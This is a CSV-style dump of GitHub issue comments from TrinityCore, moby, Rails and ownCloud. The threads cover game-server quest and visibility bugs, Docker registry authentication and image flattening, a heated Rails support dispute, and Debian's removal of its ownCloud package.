TrinityCore/TrinityCore/11476/32740555,11476,"i use navicat for windows to browse the database but for uploaded all the sql files i used ""mysql -u username -p  DATA-BASE-NAME &lt; data.sql "" from my linux console. I know everyone says ""don't use navicat"" but i've never had problems with it since mango's or trinity when i have done it locally but I didn't bother importing the dump's over the net like i said i used that bash command to upload them via linux directly &lt;code&gt; 9067;2;9;7;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9395;0;0;0;5;900;480;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;23500;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;5;0;0;0;0;0;0;0;0;0;0;0;0;0;The Party Never Ends;Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.;I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!;;You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.;Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?;Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;22775;22776;22777;0;0;0;1;1;1;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 &lt;code&gt; 9395;2;9;8;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9255;0;0;9067;1;0;60;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;Saltheril's Haven;Speak with Lord Saltheril at Saltheril's Haven in Eversong Woods.;I swear that I'm going to fireball someone if I get one more request from Lord Saltheril concerning supplies for his party!  Do I look like a party planner?!  Between you and me, that fool and his sycophants are living in denial that we're under attack here!$B$BSome of us are actually busy with, oh, I don't know, defending what's left of Quel'Thalas!  $C, would you please head over to Saltheril's Haven and see if you can shut him up?  It's just down the road to the west.;;Ah, good of Magistrix Dawnstrider to finally respond to my simple requests.  I should take up the matter of her attitude with the regent lord in Silvermoon. She's quite rude!$B$BNothing for you to concern yourself with though. Now that you're here, maybe I'll finally be able to get those party supplies that I've been waiting for? ;;;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 ",,False
TrinityCore/TrinityCore/11476/32740672,11476,Quest 2 is the one that does not trigger after quest 1 is complete with all requirements met but quest 3 does trigger when manually adding quest 2 ,,False
TrinityCore/TrinityCore/11476/32740786,11476,Research Notes is quest 1 yes ,,False
TrinityCore/TrinityCore/11476/32740831,11476,"Interestingly, that isn't listed as part of the chain, not on Wowhead or in the 4.3.4 database. I wonder if that's the error going on. ",,False
TrinityCore/TrinityCore/11476/32740915,11476,I can no longer trust wow head because wowhead is claiming this quest only existed since 4.0.1 but this quest is from the launch of BC as part of the blood elf starter quests. but it could be the issue ,,False
TrinityCore/TrinityCore/11476/32741241,11476,"For future reference, you can use something like  to get an SQL output. There may be other options to add, to strip out the unnecessary information, or just manually copy/paste the appropriate parts of the output. ",,False
TrinityCore/TrinityCore/11476/32742364,11476,oh yeah? thanks yeah I'm not very fluent in mysql query building ,,False
TrinityCore/TrinityCore/11476/32745859,11476,Everything works fine and the first quest in the chain is  !!! ,,False
TrinityCore/TrinityCore/11476/32746175,11476,hmm i'll try again i'll make a new character and start it all over again ,,False
TrinityCore/TrinityCore/11476/32746262,11476,I did forget to post my build though TrinityCore rev. 939a25346b57 TDB 335.52 ,,False
moby/moby/18569/121489632,18569,"Docker (1.9.1) only checks for 401 HTTP status code on  but it will not attempt authentication on later 401 status response codes. My use case our registry needs to allow unauthenticated pulls (therefore will return 200 on ), but it requires authentication on ""push"". Docker client version 1.9.1 Used registry  client will print ""&lt;nil&gt;"" on the console instead of attempting authentication (as it should).  ",,False
rails/rails/33009/327090891,33009,"I'm trying to learn about how to enqueue jobs into Rails as a ""background"" task, and the documentation on this topis is really not clear. Maybe someone can help me, and help update the docs. From here  What file should that function go into? Does it get called when the server starts? When does it get called? I want a function that will get called when the server starts. How do I do that? Yep, that's exactly what I want. How do I use the ""in-process"" queuing system to start a function that will run in RAM? There is no detail about that in the docs, it appears. I would like to not have to call every one of my ""background"" processes by hand when I start my server... ",,False
rails/rails/33009/392581587,33009,"Please use StackOverflow for questions/help, where a wider community will be able to help you. We reserve the issues tracker for issues only. ",,False
rails/rails/33009/392582223,33009,"StackOverflow is a really, really horrible forum. Is this a joke? Basic functionality questions are not allowed? The issue is about your documentation and the fact that it doesn't answer BASIC USER QUESTIONS! ",,False
rails/rails/33009/392582533,33009,"The fact that you guys offer no help at all and just force close issues is really upsetting. Horrible moderatorship, horrible repo maintenance, honestly. ",,False
rails/rails/33009/392583588,33009,"I don't think rafaelfranca should be moderating here. I'd ask a more senior member to step in and help, please. ",,False
rails/rails/33009/392588443,33009,"Feel free to improve the documentation. Rails is made by volunteer efforts. Some times the documentation will not answer some questions. Some times those questions don't belongs to the documentation. There are plenty of books that could answer your questions. The first questions are basic, I agree and the answer for them are Any file were you need to schedule a job. It could be in a controller, in a model, in an initializer, in a library, etc. It depends on where you put it. If you put in an initializer it will run after the application initializes. I think I answered that question above.  and make sure you are using the right job adapter. Your questions are about usage of the Ruby on Rails framework, and looks like you missing some knowledge about how rails works. I can point to you some other pages in the guides that could help you to build the knowledge to come up with the answers for those questions by yourself.  you think this should be in the documentation, please do investigate and contribute back. Now for the second set of questions No. And I'll explain in the next answer. It is not. As you can see in the Contributing file that GitHub linked to you before you opened the issue, questions about Ruby on Rails usage are not allowed on the issue tracker. We have different forums for that. One of them in Stack Overflow. If you don't like it you can use the rails-talk mailing list linked in the contributing file. I don't think this is a documentation problem, but indeed it doesn't answer all basic user questions since it can't. It is a best effort. It can answer some of the questions but some questions it will have to expect users to be able to look on other sources like books, blog posts and other guides pages in order to build the knowledge that is missing to understand how to use it. That is also your opinion and you are entitled to have it, but also consider that, like I said above, Rails is made by volunteers, and by a limited number of people. If we would be answering basic user questions for everyone that have them, neither if that was our full time job it would be possible to be able to help everyone. This is why we direct people to other forums like Stack Overflow where a wider community can be able to help. Last, but not least, as per our license THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. Even that my colleagues locked the conversations because they do think your comments were too heated, I'll unlock in case you want to rethink your attitude and, given all information and reasons that I gave you to close this issue, you want to suggest improvements. ",,False
rails/rails/33009/392607129,33009,"Although @friend was a bit aggressive, I do agree with his opinion on StackOverflow.  SO usually is toxic and rarely does it provide meaningful feedback which could help with a complex issue (e.g I've been facing rather strange issue with Rails 5.2 after updating from 5.1.4 and I wasn't able to get any feedback on it on SO or the mailing list, but I won't go into details here and instead will keep waiting and researching). The mailing list is also rather empty and I doubt many people actually read it. I do love the IRC channel but at times it's hard to keep track of a conversation. In comparison to the Elixir community, I feel like it's harder to get help and feedback on the issues you're facing with Rails. I'd love to see an equivalent of the elixirforum for our community. But anyways, we all love and appreciate all the effort and time put into Rails, the ruby ecosystem, and our somewhat-loving community, by awesome volunteers like you, @friend. ",,False
rails/rails/33009/392610382,33009,"That is a valid point @friend. I think we as a community can improve the level of support, but I really believe that GitHub is not the right place for questions about usage of software, and waiting to core member to reply those questions doesn't scale. Food for thought why the mailing list is empty and people don't read it? Would introducing a forum improve the participation? My guess the problem lays on the answers for the first question. We as a community should use the appropriated forums to help newcomers, answer questions, help each other. That responsibility is mine, yours and of everyone that is part of this community. So, if the mailing list is empty, let's fill it. If nobody reads it, let's read and reply to set the example. If people don't provide meaningful help, let's be the ones that will. As someone that had all this support when started to use rails I really believe it is possible and it doesn't require a team of 12 people to be the only ones providing this support. ",,False
rails/rails/33009/392699451,33009,"HOW??? HOW DO I ""ENQUEUE"" JOBS??? For the love of god, people. Just giving me a function prototype and telling me ""put it anywhere"" doesn't help. Why don't I use the mailing list? Because it's not anonymous. Same problem with IRC, it's really painful to use without giving up your IP address and network route. Plus, I really and truly BELIEVE that GITHUB is the place for user questions related to a repo! Why? Because it archives, and because you actually interface with the devs responsible for the project. ",,False
rails/rails/33009/392701728,33009,"I guess I'll just keep searching and trying and trying whatever random stuff I find. I'm trying to start a socket monitor with the server, parse and broadcast socket messages. I want it to automatically start with the server, and run basically like a daemon. If it dies, it would be nice it it comes back to life, eventually. If anyone can offer some advise over where to look, I'd appreciate it. I can't make heads or tails of the official documentation about the ""queue"" system. It seems to indicate there is some way to put jobs in some sort of queue, but it's not real clear on HOW. ",,False
rails/rails/33009/392711424,33009,Here's an unanswered thread on StackOverflow. I added my question there and the mods promptly deleted it. Great. ,,False
rails/rails/33009/392715187,33009,"I think I need something more like this  I think that one page about how the ""enqueue"" jobs is just super-confusing and threw me for a loop, sorry. ",,False
rails/rails/33009/392732537,33009,"@friend That's indeed true and I agree. Hard to say, I read the mailing list whenever I get a notification but most of the time I do not have an answer to the question or issue that the user is having, so in the back of my mind I just say ""Someone else will handle it"". I think this ""someone else will do it"" approach is an issue and I know that I'm not the only one that does it, unfortunately. I also believe that the mailing list is rather dull looking, and as we know, fancy stuff make people want to get involved most of the time. @friend Quite the opposite, I believe that section of the documentation does what it's supposed to do. It explains how to enque the job. And the section below it explains how to execute the jobs, which I believe is what you were looking for. In all honesty, I think you need to relax a bit and not be so aggressive.  Issues can be frustrating but it does no good to be mean to people. ",,False
rails/rails/33009/392893356,33009,"Also, in regards to the user docs, they need work. The section on ""queueing"" is really, really confusing. I was looking for how to make a process run at startup, and run basically as a daemon, and that page threw me for a complete loop. It needs to include detail on how to actually make processes run on a desired schedule, not just at some nebulous ""time in the future"". ",,False
rails/rails/33009/392961139,33009,"You are fine to disagree, but your aggressiveness, even though, I respectfully unlock the conversation so we could actually have a discussion with respect, actually bought you a permanent ban of the rails issue tracker. Enjoy! ",,False
TrinityCore/TrinityCore/8105/7639977,8105,"Core revision  7cc1b999a6f69056e88ffce04d2f26de292a6e11 Description  Console error with Object Update Failed between players, resulting in player being invisible for others. Happens randomly and sometimes whole packet is skipped for that player. All other objects are visible. Did some testing on it and seems sometimes logging out both players which don't see each other solves it, sometimes a server restart and other times changing the location of both players can do it. This can happen in two different ways  if there is only player a and b player a doesn't see player b or other way around /  both players don't see each other; if there are more players some players can see that player  but for some object update fails and they can't see him at all / player can't see some of the other players.  Example Object update failed for object 436 (Воil) for player Leikov (213) Object update failed for object 32 (Мentos) for player Leikov  (213) Object update failed for object 184 (Larvy) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213) Object update failed for object 1373 (Wilson) for player Leikov  (213) Object update failed for object 1391 (Death) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213). ",,False
TrinityCore/TrinityCore/8105/10187203,8105,"This seems to happen also for pets, totems or in case of raid buffs. Maybe it is aura-related in some way? Anyone got anything new on this? ",,False
TrinityCore/TrinityCore/8105/10526526,8105,confirmed ,,False
TrinityCore/TrinityCore/8105/10722939,8105,"Could this be due to limitation of player update fields sent to other players ( I mean these commits  /  ? I played around with it a bit and observed that modifying the number of update fields sent / sending them all can reproduce the bug each time two or more players meet, can something be bad there ? ",,False
TrinityCore/TrinityCore/8105/10928815,8105,"Seems to be a wrong packet structure being send i think, if you check it handles the CMSG opcode that is being received and calsl the object failed. Soooo this could be because the packet has been sended wrong? ",,False
TrinityCore/TrinityCore/8105/10956434,8105,@friend prolly not. Objects/Npcs keep disappearing as well once 2 or more players reach in sight. ,,False
TrinityCore/TrinityCore/8105/11679686,8105,any temp solution? ,,False
TrinityCore/TrinityCore/8105/11721605,8105,None that I know of as of now ;( ,,False
TrinityCore/TrinityCore/8105/11778063,8105,"anyone can help me, does it possible to make in game command, witch can repop player update? so it basicly make ppl visible if they use that command? ",,False
TrinityCore/TrinityCore/8105/11803531,8105,"Still wondering who is assigning issue priorities.. Without object update working as intended there's no way to even play the game,but it's better to have spells as a higher priority..huh. ",,False
TrinityCore/TrinityCore/8105/11820344,8105,"You are NOT supposed to use the 4.3.4 branch for production environments, it IS in alpha / beta state, and WILL have bugs. We (devs) work on whatever we WANT to work on, whatever is FUN for us to work on, not on some ""important"" bug because it prevents people from creating 4.3.4 private servers ",,False
TrinityCore/TrinityCore/8105/11825222,8105,"I don't really care,I've fixed that on my local. Just wondering of whom is assigning priorities no matter the branch's current state as he clearly isn't paying attention or is just ignorant. I didn't say that I expect the 4.3 branch to have no bugs,master has enough already,anyways. And this isn't stopping anyone(or at least me) to get my stuff rolling ;) ",,False
TrinityCore/TrinityCore/8105/11829121,8105,@friend What exactly are you doing here? With that shitty attitude you might as well just leave. ,,False
TrinityCore/TrinityCore/8105/11833568,8105,"please just be cool anyway hopefuly some devs can look at this, could be nice to have it fixed and IntelFreak share fix? or .. ",,False
TrinityCore/TrinityCore/8105/11833668,8105,"You know, that makes us want to stop developing sometimes, you take tons and tons (thousands of lines, according to ohloh) of code, made by us / other contributors, modify it, claim that you have something working, and just don't share it back. ",,False
TrinityCore/TrinityCore/8105/11834007,8105,"I do not care about any other user here weaving around aboot some fixes here they made that none of followers of TC can experience. It's crap, it's ignorant and it really ain't nice. I want to just let my fav db dev know that he is best at his work around here, Malcrom D ",,False
TrinityCore/TrinityCore/8105/11865175,8105,Would be nice if you mentioned exact steps to reproduce this as i had a hard time trying to figure it out. Im guessing more than 1 player must be involved so i can't test it alone. ,,False
TrinityCore/TrinityCore/8105/11939928,8105,"one problem i can reproduce ,  player A duel with player B player A mage cast invisibility, player B stays without move after player A invisibility fades, player A cant see player B until player B move. thats just one visibility bug, but trying to find out other (perma invis until relog) bugs ",,False
TrinityCore/TrinityCore/8105/11999117,8105,"that bug with invisibility seems fixed on latest rev, not sure about global player update visibility ",,False
TrinityCore/TrinityCore/8105/12161690,8105,@friend can you pls share your fix? ,,False
TrinityCore/TrinityCore/8105/13240693,8105,just to confirm bug still there ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Abnormally (606513) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Wlk (586392) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Agressive (351952) ERROR [NETWORKIO] Object update failed for object 606513 (Abnormally) for player Rychard (100037876) ERROR [NETWORKIO] Attempted to get value with size 3 in ByteBuffer (pos 2 size 16) [Stack trace /opt/RC_TC/bin/worldserver(_ZN12WorldSession6UpdateEjR12PacketFilter+0x8f0) [0xd30000] /opt/RC_TC/bin/worldserver(_ZN5World14UpdateSessionsEj+0x112) [0xdcd0e2] /opt/RC_TC/bin/worldserver(_ZN5World6UpdateEj+0x227) [0xdd2667] /opt/RC_TC/bin/worldserver(_ZN13WorldRunnable3runEv+0x1b4) [0x8de414] /opt/RC_TC/bin/worldserver(_ZN9ACE_Based6Thread10ThreadTaskEPv+0xa) [0xfd681a] /usr/local/lib/libACE-6.0.0.so(_ZN21ACE_OS_Thread_Adapter6invokeEv+0xa5) [0x7f99af463f75] /lib/x86_64-linux-gnu/libpthread.so.0(+0x6d8c) [0x7f99add9ad8c] /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f99adae4fdd] ] ,,False
TrinityCore/TrinityCore/8105/13849759,8105,I got this messages when tryin to tame beast (mb cuz last id in character_pet table is rly big?) =) If truncate tables character_pet / pet_aura / pet_spells / pet_spell_cooldown - everything going well... ,,False
TrinityCore/TrinityCore/8105/17461522,8105,"still bug, please fix it ",,False
TrinityCore/TrinityCore/8105/17824405,8105,"lol, go to AC webs and bump. ",,False
TrinityCore/TrinityCore/8105/17956850,8105,is it caused by some commit or that problem is from start? ,,False
TrinityCore/TrinityCore/8105/18083554,8105,can someone send file with packet communication on this error? i cant reproduce it on localhost -(  can use this for sniff it works ok ,,False
TrinityCore/TrinityCore/8105/19616942,8105,"i could not 100% reproduce the error msg, but after some testing i figured out a stupid bug if you JUMP thru any portal client will stuck at loading screen. I didnt get any error msg for this however. anyway, problem is at Object_BuildMovementUpdate temp solution is to disable jump flags in the update object just comment these two lines hasFallDirection = self-&gt;m_movementInfo.bits.hasFallDirection; hasSplineElevation = self-&gt;m_movementInfo.bits.hasSplineElevation; (it can be found in two places, just below each other) after this, client loading didnt stuck anymore while jumping to portals.. ",,False
TrinityCore/TrinityCore/8105/19621136,8105,so jumping while teleport makes you stuck? (someone tryed to reproduce this with jump + .tele? D ,,False
TrinityCore/TrinityCore/8105/19623720,8105,"tryed it with tele to other map, no errors, but with jump + instanceportal its a 100% stuck for us ",,False
TrinityCore/TrinityCore/8105/19624435,8105,"Confirmed, sometimes also seen on master. ",,False
TrinityCore/TrinityCore/8105/19838540,8105,still could not directly reproduce this update fail bug... it comes back randomly tho.. ,,False
TrinityCore/TrinityCore/8105/19839573,8105,sniff with data fail (btw you can enably packet logging in core.. no need for sniffer in local..)  with wpp and search for CMSG_OBJECT_UPDATE_FAILED ,,False
TrinityCore/TrinityCore/8105/21415529,8105,"@friend is easy to fix it, you need get some functions from update visibility from cmangos (they have implemented, Trinity no), and make some changes for get working it. ",,False
TrinityCore/TrinityCore/8105/21416324,8105,Walkum thx for help ,,False
TrinityCore/TrinityCore/8105/21482281,8105,@friend that is where you need to fix? Help please. Thank you. ,,False
TrinityCore/TrinityCore/8105/21690085,8105,"share fix, please... ( ",,False
TrinityCore/TrinityCore/8105/22070324,8105,also looking for solution / ,,False
TrinityCore/TrinityCore/8105/22077825,8105,"yeah,  i want to know what code walkum said. ",,False
TrinityCore/TrinityCore/8105/22374320,8105,@friend Could you please link to this code or pm me? ,,False
TrinityCore/TrinityCore/8105/23044437,8105,Object update failed for object 17371279370823581417 (Doodad_InstanceNewPortal_Purple01) for player Mags (27) Object update failed for object 17371279375118548714 (Doodad_InstanceNewPortal_Purple_Skull01) for player Mags (27) Only I have left? ,,False
TrinityCore/TrinityCore/8105/23045287,8105,"this partially fixes visibility, Creatures still sometimes, well a lot of the time don't load up on login/teleport. as well as game objects and players. However players seem to pop up out of the visibility issue over time when they move around/cast w/e. ",,False
TrinityCore/TrinityCore/8105/23045702,8105,How to repeat 2 players. player1 .tele gmis player2 .tele zula player2 .sum player1 and immediately press jump PROFIT! ) ,,False
TrinityCore/TrinityCore/8105/23047553,8105,player 1 or 2 jumps? ,,False
TrinityCore/TrinityCore/8105/23050096,8105,"For me, Spawn creatures on gm island = when you tele there or login creatures are invisible until you do .respawn. ",,False
TrinityCore/TrinityCore/8105/23151965,8105,"yep, problem is still here. ",,False
TrinityCore/TrinityCore/8105/25647787,8105,"problem still exists afaik... and another way to reproduce, set all speeds to 0 in any creature_Template, it will write the update error ",,False
TrinityCore/TrinityCore/8105/25681014,8105,Speeds equal to 0 should not be allowed for any object - client explicitly rejects such objects ,,False
TrinityCore/TrinityCore/8105/25695939,8105,"thats fine but in tdb some creatures (cannons?) have speed 0 so players can not move with them. anyway, after cleaning the db of 0 speeds, the update fail error still happens, sometimes for 1 unit, whole instance, or  even for self. i made some changes to the core, all smsg_update_objects packets get stored in vector for each player, and when a player gets the failed error it dumps all packets to a parsable bin file,   it clears the packet list after all smsg_new_world packets (when teleporting) to minimize the number of packets saved. i'll run this for a while then upload the bins here. example Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515)  was only 1 SMSG_UPDATE_OBJECT packet in his dump which had the entry of Orgrimmar Thief UNIT_FIELD_HEALTH 0/0 this looks strange to me... how ever, i could not reproduce the bug, the creature has &gt;0 hp in db ",,False
TrinityCore/TrinityCore/8105/25703249,8105,"updates_8515_parsed.txt Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515) (Unit Entry 42594 Low 1269632 is the npc) updates_27473_parsed.txt Object update failed for object 17379456185396262882 (Murky) for player Tfh (27473) (Unit Entry 15186 Low 161762 is the npc) updates_157003_parsed.txt Object update failed for object 155636 (Flink) for player Chupakabra (157003) updates_153694_parsed.txt Object update failed for object 140454 (Misral) for player Tapolynokill (153694) updates_146553_parsed.txt Object update failed for object 157256 (Tokitozuka) for player Enforced (146553) updates_105663_parsed.txt Object update failed for object 128558 (Epherandes) for player Manigo (105663) updates_122856_parsed.txt Object update failed for object 155636 (Flink) for player Smash (122856) the bugged packet is always the last one in the files zip bins + parsed with wpp, no parse errors ",,False
TrinityCore/TrinityCore/8105/25710836,8105,Your method of debugging this is not reliable - client sends CMSG_OBJECT_UPDATE_FAILED when it received VALUES block for an object it cannot see (didn't receive CreateObject or movement block had bad data); this means it will never fail because of bad values in updatefields ,,False
TrinityCore/TrinityCore/8105/25711340,8105,"okey, then why arent the create packets sent corretcly? ",,False
TrinityCore/TrinityCore/8105/25748161,8105,"The packets sended correctly, but if you send not allowed values by client side in the SMSG_OBJECT_UPDATE (e.g speed=0) the client ignore this object and send to server  CMSG_OBJECT_UPDATE_FAILED, but the problem is fixed, check your database and change the not allowed values to not receive this error ",,False
TrinityCore/TrinityCore/8105/25753747,8105,"as i wrote above, there is no npc with speed 0 in db, and most of the errors come from players, i dont think they can have 0 speeds... ",,False
TrinityCore/TrinityCore/8105/25765027,8105,What about players that have auras with -100% movement speed? Maybe we are handling these wrong ,,False
TrinityCore/TrinityCore/8105/25765127,8105,"No ^^ it's auras which handle Movement ) For ex. Suspend gravity! How do i know? Because i'm working on gunship_battle 4.3.4 and everytime i use movement flag i get that error ^^ Like when you enter the Transport you actually do get an Spell (Aura), that says, that you'r eon the Transport and then it wants to update ",,False
TrinityCore/TrinityCore/8105/25767212,8105,"If you have a new way to reproduce it, why don't you tell us what it is? ",,False
TrinityCore/TrinityCore/8105/25767470,8105,"didn't i do that before? Try any Spells, which will update the movement of anything.. ",,False
TrinityCore/TrinityCore/8105/25768385,8105,"No, I am not getting issues with them, you could at least give me a scenario how to cast it, what to cast, who to target and stuff ",,False
TrinityCore/TrinityCore/8105/25788239,8105,"shauren was right, any speed mods which set speed to 0 create errors.. expample spell 102937 Demon Grip Root - 100% speed to reproduce add aura 102937 to a player (should work winth any unit tho) run/fly out of view distance of it go back you will notice that most of 'worldobjects' which were sent in the same packet are not visible you will get the first update failed error if any of those objects send an update example a player unequips an item ",,False
TrinityCore/TrinityCore/8105/25805076,8105,"btw, why is this closed? ",,False
TrinityCore/TrinityCore/8105/26491988,8105,"did some more tests i logged all speed vars in all create packets, none of them was 0, so this isnt to source of the bug (adding -100% speed auras still reproduce the error, but those are not used in TC currently for any scripts afaik) another thing i tried is, i added a check when core receives the fail packet, and checked m_clientGUIDs for the given guid and m_clientGUIDs always had the guid in list, so the bugged object is always visible from core side for the player so i guess somehow the createblock is not sent to the client any ideas? ",,False
TrinityCore/TrinityCore/8105/26514548,8105,"Maybe an error in the order the packets are sent, or they way they are processed by the client? as in, we send the CreateObject first but the client processes the UpdateValues before it? ",,False
TrinityCore/TrinityCore/8105/30561553,8105,"i still dont know why is this closed, the bug is still happening as before.. ",,False
moby/moby/332/12789670,332,"There's no way to flatten images right now. When performing a build in multiple steps, a few images can be generated and a larger number of layers is produced. When these are pushed to the registry, a lot of data and a large number of layers have to be downloaded. There are some cases where one starts with a base image (or another image), changes some large files in one step, changes them again in the next and deletes them in the end. This means those files would be stored in 2 separate layers and deleted by whiteout files in the final image. These intermediary layers aren't necessarily useful to others or to the final deployment system. Image flattening should work like this  the history of the build steps needs to be preserved the flattening can be done up to a target image (for example, up to a base image) the flattening should also be allowed to be done completely (as if exporting the image)  ",,False
moby/moby/332/349283405,332,"It's been over a year now, any plans to introduce the ""--squash"" option into the CE codebase other than via the ""--experimental"" way. ",,False
core/owncloud/24232/150802607,24232,"I'm a happy Debian and ownCloud user for a long time now. Today I saw the package being evicted from Debian's repo and I was sad. Digging a little bit around I arrive to things like #22691. In principle the PR is ok, bugs in software package by Debian should first be reported in Debian's BTS and the maintainer should decide whether is part of her patches or it should be forwarded upstream. At least that's how usually should work. Alas, this is not the first time upstream that has problems with bugs reported to things done downstream. I also understand, from what I read, that in this case downstream didn't properly communicate with the ownCloud community, but I don't think that alienating downstream is the best solution. I think a better approach is to apply a variant of Postel's law ""Be open in what you receive, and strict in what you send"". As the Debian maintainer said, 'we’re doing our best to offer it to our users'. One of the things that this implies, more or less, is that the maintainer will try to keep the upgrade path as smooth as possible. In general, Debian has a very good record on upgrade paths, and personally that's why I chose it. Unluckily I can't see the patch because the package has been removed, so I can't help in that particular case. I wish this kind of problems could be solved any time soon, and this is my way to try to make that happen. I appreciate Jos's mail, because it goes in the same direction. As an outsider to the particular problem but also as a developer of database based applications, wouldn't it be possible to apply each individual upgrade script from the original release all the way to the latest one? ",,False
core/owncloud/24232/214252515,24232,"@friend You could but each app has its own update scripts. It'd be possible, but it is just a huge amount of work to develop and test on all the databases and stuff ownCloud supports. You're also not unlikely to end up with special bugs that won't show up until you upgrade some day in the future, and they'll be impossible to debug by then. It is just very fragile. A proper solution would require a new updater technology that is more stand-alone and designed to do this - that was introduced in ownCloud 9.0 and might allow stuff like this later in the 9.x series, but bolting that on the older releases is a huge, complex task. The best solution would be to write an independent upgrade script that does it all on its own, supporting all apps and databases. That, too, is a huge task, but less likely to break everything. I wouldn't oppose that last thing but who's going to do the work? For now, I'm writing on a blog post to help ppl manually upgrade from the Debian package to our official 8.0 package, then 8.1, then 8.2 and then they can decide if they want 9.0 already or not. (there is no reason to stick to anything older than 8.2, at least not if you value your data and security). Help testing that how-to would be super welcome... I was hoping to have a draft last week but stuff got in the way, will work on it today. ",,False
core/owncloud/24232/214261900,24232,"I see, and I think that what the maintainer tried to do was to solve it the best he could (his own words). Reacting like 'I'd even consider a warning about not using Debian packages on our download page fair enough' is not helping in the discussion. I just wish that for the sake of ownCloud's relationship with distributions you acknowledge it. Maybe some of you think distros are not important ('Don't worry guys, owncloud is going to be removed from Debian anyway and is also planned for Fedora. So this problem is going to resolve itself pretty soon.'), but as a user of both (apps and distros) I assure you most people just use that. In the particular problem, I see you also have upgrade problems. What Iḿ trying to say is that the maintainer is trying his best for the time being, just like you and anybody else. ",,False
core/owncloud/24232/214262354,24232,That's outrightly wrong. See  on how Fedora did handle this. The Fedora packagers did actually get in touch with us in advance unlike some other distribution packagers 😉 ,,False
core/owncloud/24232/214264890,24232,"@friend I was just quoting. Bravo for Fedora. Also, keeping that attitude doesn't help a little bit. Yes, I agree that there was some kind of miscommunication, but reacting that way does not put you in a good light either. So what I think both sides should do is to get together and work on it. I hope the invitation for the meeting in September is taken, but it's my opinion that should think of other ways to better communicate with downstream. ",,False
core/owncloud/24232/214266603,24232,"Hmm, I just noticed the comment I was quoting was probably not from someone from the ownCloud community  that's the case, my mistake. In any case, what he says after that goes in line to what I want to say here. ",,False
core/owncloud/24232/214340961,24232,"I know he wanted to solve it the best way he could. But that doesn't make it a good idea. Doing open hart surgery on yourself might be done with great intentions but it's not smart either way. We expressed worries as we ourselves would not feel confident in our own ability to do this and we certainly didn't and don't expect a packager who doesn't even talk to us to do a decent job protecting the data of our users in his free time. Add to that the thought of having to deal with the bug reports and many broken installations and damage to our reputation this would cause and you can imagine why we responded with a ""please don't do this"". That was our 'official' response, not You can't blame us for discussing this internally and people then giving their opinion. That isn't our communication and really, don't expect me to tell people to stop giving their opinion on our own mailing lists, bug tracker and other communication channels. Honestly, I don't think we did anything particularly wrong here. We asked downstream not to risk the data of our users. They got upset and dropped ownCloud packaging. Their right, not our fault. As I said, I'll write a blog to help users migrate from Debian packages to our packages. Feedback and help with that would be welcome. I see no point in doing anything else as the current ownCloud packagers at Debian have made it very clear they don't want to continue working on packages. If somebody else steps up, they'll get the same support anybody else (like Fedora) gets when they ask. We're of course critical of the distribution rules that make packaging ownCloud harder than it needs to be, but that's an entirely different issue and other distributions are starting to move to fix that (eg snappy, Project Atomic, XDG-Apps etc) so in time, Debian will probably become a good place for ownCloud again. With regards to upgrade problems on the ownCloud side sure. ownCloud is very flexible and it is nearly impossible to test all combinations of technologies we support without more help. Our packages aren't perfect either and we're not terribly happy with the deployment options we can give to users. Help with the packages is of course welcome, you can find sources here. If you don't mind I'll close this issue. I'll share steps on upgrading Debian packages here when I've got some, would love to hear if they work and what feedback you have. ",,False
core/owncloud/24232/214359934,24232,"Ok, sorry for the confusion, but from a user perspective, I think I just fell into a similar error that would be to report a bug here about the Debian packaging. I think you should try to use a less public method for your internal discussions; the issue being public doesn't help distinguish form an internal discussion. Well, that package version was aimed to , which by default you have to jump over several hoops just to get one package form it. People who use it know things might break, but it's a Debian mechanism to pretest packages. I agree it's not a complete solution and probably a sloppy one. My aim with that paragraph was to highlight that in both sides, like everywhere else, software is always WIP and that you will most always find flaws. Trying to say ""don't point fingers"" I ended pointing a finger, how ironic... ( ",,False
